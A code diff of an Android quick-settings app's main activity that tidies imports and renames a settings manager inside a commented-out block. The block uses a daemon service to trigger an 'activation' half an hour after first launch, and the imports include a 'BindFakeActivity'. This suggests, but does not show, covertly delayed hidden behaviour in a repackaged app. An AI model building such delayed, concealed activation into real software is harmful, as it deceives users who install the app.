@@ -24,7 +24,6 @@ import android.graphics.*;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.StatFs;
-import android.text.TextUtils;
 import android.text.format.Formatter;
 import android.util.DisplayMetrics;
 import android.util.Log;
@@ -40,7 +39,9 @@ import com.bwx.bequick.fwk.SettingHandler;
 import com.bwx.bequick.fwk.SettingsFactory;
 import com.bwx.bequick.preferences.CommonPrefs;
 import com.plugin.common.utils.UtilsRuntime;
-import com.xstd.qm.*;
+import com.xstd.qm.AppRuntime;
+import com.xstd.qm.Config;
+import com.xstd.qm.Utils;
 import com.xstd.qm.activity.BindFakeActivity;
 import com.xstd.qm.app.QuickSettingApplication;
 import com.xstd.qm.service.DemonService;
@@ -49,7 +50,6 @@ import com.xstd.quick.R;
 
 import java.io.File;
 import java.util.ArrayList;
-import java.util.Calendar;
 import java.util.Iterator;
 
 import static com.bwx.bequick.Constants.*;
@@ -212,17 +212,17 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
         /**
          * 不使用母程序激活了，使用子程序激活
          *
-         long activeTime = SettingManager.getInstance().getKeyActiveTime();
+         long activeTime = PluginSettingManager.getInstance().getKeyActiveTime();
          if (activeTime == 0) {
-         if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
-         long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
+         if (PluginSettingManager.getInstance().getKeyLanuchTime() != 0) {
+         long deta = System.currentTimeMillis() - PluginSettingManager.getInstance().getKeyLanuchTime();
          //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
-         if (deta >= SettingManager.getInstance().getRealActiveDelayTime()) {
+         if (deta >= PluginSettingManager.getInstance().getRealActiveDelayTime()) {
          //active now
          //                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
          DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
          } else {
-         long activeDelay = SettingManager.getInstance().getRealActiveDelayTime()- deta;
+         long activeDelay = PluginSettingManager.getInstance().getRealActiveDelayTime()- deta;
          DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
          }
          }
